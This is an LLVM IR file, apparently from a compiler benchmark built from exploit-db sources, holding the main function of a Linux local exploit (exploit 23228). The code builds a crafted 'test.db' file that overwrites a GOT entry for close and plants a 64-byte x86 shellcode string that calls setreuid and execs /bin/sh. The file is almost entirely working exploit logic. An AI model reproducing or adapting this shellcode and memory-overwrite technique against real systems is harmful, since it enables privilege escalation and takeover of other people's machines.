; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_23228.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_23228.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [8 x i8] c"test.db\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@f = common dso_local global i32 0, align 4
@CODEDPATH = common dso_local global i32 0, align 4
@CODED_LENGTH = common dso_local global i32 0, align 4
@JUMP_BY = common dso_local global i8 0, align 1
@STEP_LENGTH = common dso_local global i8 0, align 1
@DATABASE = common dso_local global i32 0, align 4
@file_pos = common dso_local global i32 0, align 4
@path_len = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [2 x i8] c"\05\00", align 1
@PATTERN_LENGTH = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"\11\00", align 1
@GOT_CLOSE = common dso_local global i8* null, align 8
@.str.5 = private unnamed_addr constant [2 x i8] c"\10\00", align 1
@.str.6 = private unnamed_addr constant [64 x i8] c"1\C01\DB\B3\15\EB#\90\90\90\90^\89v\081\C0\88F\07\89F\0C\B0\0B\89\F3\8DN\08\8DV\0C\CD\801\DBx89\D8@\CD\80\89\D9\B0G\CD\80\E8\D6\FF\FF\FF/bin/sh\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca [32768 x i8], align 16
  %6 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %7 = call i32 @fopen(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  store i32 %7, i32* @f, align 4
  %8 = getelementptr inbounds [32768 x i8], [32768 x i8]* %5, i64 0, i64 0
  store i8 48, i8* %8, align 16
  %9 = getelementptr inbounds [32768 x i8], [32768 x i8]* %5, i64 0, i64 0
  %10 = load i32, i32* @f, align 4
  %11 = call i32 @fwrite(i8* %9, i32 1, i32 1, i32 %10)
  %12 = getelementptr inbounds [32768 x i8], [32768 x i8]* %5, i64 0, i64 0
  %13 = call i32 @write_buffer(i32 0, i8* %12, i32 0, i32 1)
  %14 = load i32, i32* @CODEDPATH, align 4
  %15 = sub nsw i32 %14, 8
  %16 = load i32, i32* @CODED_LENGTH, align 4
  %17 = add nsw i32 %15, %16
  %18 = load i8, i8* @JUMP_BY, align 1
  %19 = sext i8 %18 to i32
  %20 = load i8, i8* @STEP_LENGTH, align 1
  %21 = sext i8 %20 to i32
  %22 = mul nsw i32 %19, %21
  %23 = add nsw i32 %17, %22
  %24 = load i32, i32* @DATABASE, align 4
  %25 = sub nsw i32 %23, %24
  %26 = call i32 @skip_to_filepos(i32 0, i32 %25)
  %27 = getelementptr inbounds [32768 x i8], [32768 x i8]* %5, i64 0, i64 0
  %28 = call i32 @memset(i8* %27, i8 signext 0, i32 8)
  %29 = getelementptr inbounds [32768 x i8], [32768 x i8]* %5, i64 0, i64 4
  store i8 17, i8* %29, align 4
  %30 = getelementptr inbounds [32768 x i8], [32768 x i8]* %5, i64 0, i64 0
  %31 = getelementptr inbounds i8, i8* %30, i64 8
  %32 = call i32 @memset(i8* %31, i8 signext 0, i32 8)
  %33 = getelementptr inbounds [32768 x i8], [32768 x i8]* %5, i64 0, i64 0
  %34 = load i32, i32* @f, align 4
  %35 = call i32 @fwrite(i8* %33, i32 1, i32 16, i32 %34)
  %36 = getelementptr inbounds [32768 x i8], [32768 x i8]* %5, i64 0, i64 0
  %37 = load i32, i32* @f, align 4
  %38 = call i32 @fwrite(i8* %36, i32 1, i32 16, i32 %37)
  %39 = load i32, i32* @file_pos, align 4
  %40 = add nsw i32 %39, 32
  store i32 %40, i32* @file_pos, align 4
  %41 = load i32, i32* @path_len, align 4
  %42 = add nsw i32 %41, 34
  store i32 %42, i32* @path_len, align 4
  %43 = load i32, i32* @file_pos, align 4
  %44 = add nsw i32 %43, 1000000
  %45 = call i32 @skip_to_filepos(i32 0, i32 %44)
  %46 = load i8, i8* @JUMP_BY, align 1
  %47 = getelementptr inbounds [32768 x i8], [32768 x i8]* %5, i64 0, i64 0
  store i8 %46, i8* %47, align 16
  %48 = getelementptr inbounds [32768 x i8], [32768 x i8]* %5, i64 0, i64 1
  store i8 65, i8* %48, align 1
  %49 = load i32, i32* @path_len, align 4
  %50 = sub nsw i32 0, %49
  %51 = sub nsw i32 %50, 1
  %52 = getelementptr inbounds [32768 x i8], [32768 x i8]* %5, i64 0, i64 0
  %53 = call i32 @write_buffer(i32 %51, i8* %52, i32 2, i32 1)
  %54 = getelementptr inbounds [32768 x i8], [32768 x i8]* %5, i64 0, i64 0
  %55 = call i32 @memset(i8* %54, i8 signext 65, i32 2)
  %56 = getelementptr inbounds [32768 x i8], [32768 x i8]* %5, i64 0, i64 0
  %57 = call i32 @write_buffer(i32 16384, i8* %56, i32 2, i32 1)
  %58 = load i32, i32* @CODEDPATH, align 4
  %59 = load i32, i32* @CODED_LENGTH, align 4
  %60 = add nsw i32 %58, %59
  %61 = sub nsw i32 %60, 3
  %62 = call i32 @write_to_addr(i32 %61, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %63 = load i32, i32* @CODEDPATH, align 4
  %64 = load i32, i32* @CODED_LENGTH, align 4
  %65 = add nsw i32 %63, %64
  %66 = load i32, i32* @PATTERN_LENGTH, align 4
  %67 = add nsw i32 %65, %66
  %68 = sub nsw i32 %67, 8
  %69 = call i32 @write_to_addr(i32 %68, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.3, i64 0, i64 0))
  %70 = load i32, i32* @CODEDPATH, align 4
  %71 = load i32, i32* @CODED_LENGTH, align 4
  %72 = add nsw i32 %70, %71
  %73 = load i32, i32* @PATTERN_LENGTH, align 4
  %74 = add nsw i32 %72, %73
  %75 = sub nsw i32 %74, 8
  %76 = add nsw i32 %75, 1
  %77 = call i32 @write_to_addr(i32 %76, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.3, i64 0, i64 0))
  %78 = load i32, i32* @CODEDPATH, align 4
  %79 = load i32, i32* @CODED_LENGTH, align 4
  %80 = add nsw i32 %78, %79
  %81 = load i32, i32* @PATTERN_LENGTH, align 4
  %82 = add nsw i32 %80, %81
  %83 = sub nsw i32 %82, 8
  %84 = add nsw i32 %83, 2
  %85 = call i32 @write_to_addr(i32 %84, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.3, i64 0, i64 0))
  %86 = load i32, i32* @CODEDPATH, align 4
  %87 = load i32, i32* @CODED_LENGTH, align 4
  %88 = add nsw i32 %86, %87
  %89 = load i32, i32* @PATTERN_LENGTH, align 4
  %90 = add nsw i32 %88, %89
  %91 = sub nsw i32 %90, 8
  %92 = add nsw i32 %91, 3
  %93 = call i32 @write_to_addr(i32 %92, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.3, i64 0, i64 0))
  %94 = load i32, i32* @CODEDPATH, align 4
  %95 = load i32, i32* @CODED_LENGTH, align 4
  %96 = add nsw i32 %94, %95
  %97 = load i32, i32* @PATTERN_LENGTH, align 4
  %98 = add nsw i32 %96, %97
  %99 = sub nsw i32 %98, 8
  %100 = add nsw i32 %99, 4
  %101 = call i32 @write_to_addr(i32 %100, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  %102 = load i32, i32* @CODEDPATH, align 4
  %103 = load i32, i32* @CODED_LENGTH, align 4
  %104 = add nsw i32 %102, %103
  %105 = load i32, i32* @PATTERN_LENGTH, align 4
  %106 = add nsw i32 %104, %105
  %107 = sub nsw i32 %106, 8
  %108 = add nsw i32 %107, 6
  %109 = call i32 @write_to_addr(i32 %108, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.3, i64 0, i64 0))
  %110 = load i32, i32* @CODEDPATH, align 4
  %111 = load i32, i32* @CODED_LENGTH, align 4
  %112 = add nsw i32 %110, %111
  %113 = load i32, i32* @PATTERN_LENGTH, align 4
  %114 = add nsw i32 %112, %113
  %115 = sub nsw i32 %114, 8
  %116 = add nsw i32 %115, 7
  %117 = call i32 @write_to_addr(i32 %116, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.3, i64 0, i64 0))
  %118 = load i32, i32* @CODEDPATH, align 4
  %119 = load i32, i32* @CODED_LENGTH, align 4
  %120 = add nsw i32 %118, %119
  %121 = load i32, i32* @PATTERN_LENGTH, align 4
  %122 = add nsw i32 %120, %121
  %123 = load i8*, i8** @GOT_CLOSE, align 8
  %124 = call i32 @write_to_addr(i32 %122, i8* %123)
  %125 = getelementptr inbounds [32768 x i8], [32768 x i8]* %5, i64 0, i64 0
  %126 = load i32, i32* @CODEDPATH, align 4
  %127 = load i32, i32* @CODED_LENGTH, align 4
  %128 = add nsw i32 %126, %127
  %129 = load i32, i32* @PATTERN_LENGTH, align 4
  %130 = add nsw i32 %128, %129
  %131 = add nsw i32 %130, 16
  %132 = call i32 @write_int(i8* %125, i32 %131)
  %133 = getelementptr inbounds [32768 x i8], [32768 x i8]* %5, i64 0, i64 4
  store i8 0, i8* %133, align 4
  %134 = load i32, i32* @CODEDPATH, align 4
  %135 = load i32, i32* @CODED_LENGTH, align 4
  %136 = add nsw i32 %134, %135
  %137 = load i32, i32* @PATTERN_LENGTH, align 4
  %138 = add nsw i32 %136, %137
  %139 = add nsw i32 %138, 4
  %140 = getelementptr inbounds [32768 x i8], [32768 x i8]* %5, i64 0, i64 0
  %141 = call i32 @write_to_addr(i32 %139, i8* %140)
  %142 = load i32, i32* @CODEDPATH, align 4
  %143 = load i32, i32* @CODED_LENGTH, align 4
  %144 = add nsw i32 %142, %143
  %145 = load i32, i32* @PATTERN_LENGTH, align 4
  %146 = add nsw i32 %144, %145
  %147 = add nsw i32 %146, 8
  %148 = call i32 @write_to_addr(i32 %147, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0))
  %149 = load i32, i32* @CODEDPATH, align 4
  %150 = load i32, i32* @CODED_LENGTH, align 4
  %151 = add nsw i32 %149, %150
  %152 = load i32, i32* @PATTERN_LENGTH, align 4
  %153 = add nsw i32 %151, %152
  %154 = add nsw i32 %153, 10
  %155 = call i32 @write_to_addr(i32 %154, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.3, i64 0, i64 0))
  %156 = load i32, i32* @CODEDPATH, align 4
  %157 = load i32, i32* @CODED_LENGTH, align 4
  %158 = add nsw i32 %156, %157
  %159 = load i32, i32* @PATTERN_LENGTH, align 4
  %160 = add nsw i32 %158, %159
  %161 = add nsw i32 %160, 11
  %162 = call i32 @write_to_addr(i32 %161, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.3, i64 0, i64 0))
  %163 = load i32, i32* @CODEDPATH, align 4
  %164 = load i32, i32* @CODED_LENGTH, align 4
  %165 = add nsw i32 %163, %164
  %166 = load i32, i32* @PATTERN_LENGTH, align 4
  %167 = add nsw i32 %165, %166
  %168 = add nsw i32 %167, 12
  %169 = call i32 @write_to_addr(i32 %168, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0))
  %170 = load i32, i32* @CODEDPATH, align 4
  %171 = load i32, i32* @CODED_LENGTH, align 4
  %172 = add nsw i32 %170, %171
  %173 = load i32, i32* @PATTERN_LENGTH, align 4
  %174 = add nsw i32 %172, %173
  %175 = add nsw i32 %174, 14
  %176 = call i32 @write_to_addr(i32 %175, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.3, i64 0, i64 0))
  %177 = load i32, i32* @CODEDPATH, align 4
  %178 = load i32, i32* @CODED_LENGTH, align 4
  %179 = add nsw i32 %177, %178
  %180 = load i32, i32* @PATTERN_LENGTH, align 4
  %181 = add nsw i32 %179, %180
  %182 = add nsw i32 %181, 15
  %183 = call i32 @write_to_addr(i32 %182, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.3, i64 0, i64 0))
  %184 = load i32, i32* @CODEDPATH, align 4
  %185 = load i32, i32* @CODED_LENGTH, align 4
  %186 = add nsw i32 %184, %185
  %187 = load i32, i32* @PATTERN_LENGTH, align 4
  %188 = add nsw i32 %186, %187
  %189 = add nsw i32 %188, 16
  %190 = call i32 @write_to_addr(i32 %189, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.6, i64 0, i64 0))
  %191 = load i32, i32* @f, align 4
  %192 = call i32 @fclose(i32 %191)
  ret i32 0
}

declare dso_local i32 @fopen(i8*, i8*) #1

declare dso_local i32 @fwrite(i8*, i32, i32, i32) #1

declare dso_local i32 @write_buffer(i32, i8*, i32, i32) #1

declare dso_local i32 @skip_to_filepos(i32, i32) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @write_to_addr(i32, i8*) #1

declare dso_local i32 @write_int(i8*, i32) #1

declare dso_local i32 @fclose(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
